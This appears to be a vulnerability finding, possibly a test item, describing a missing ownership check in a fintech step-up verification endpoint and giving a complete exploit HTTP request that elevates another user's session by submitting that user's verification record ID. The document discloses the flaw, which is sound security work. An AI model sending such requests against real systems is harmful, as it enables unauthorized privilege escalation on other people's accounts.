diagnosis: The step-up elevation route marks a verification session as elevated based on verificationRecordId supplied in the request body without checking whether the authenticated session user matches record.accountId. An attacker can supply another user's verificationRecordId and complete the verification to elevate permissions on that user's session.
exploit_request:
POST /api/auth/stepup/verify-code HTTP/1.1
Host: auth.fintech.internal:6006
Authorization: Bearer <attacker_jwt>
Content-Type: application/json

{
  "verificationRecordId": "vrec_investor_corp_8819",
  "otpCode": "128490"
}
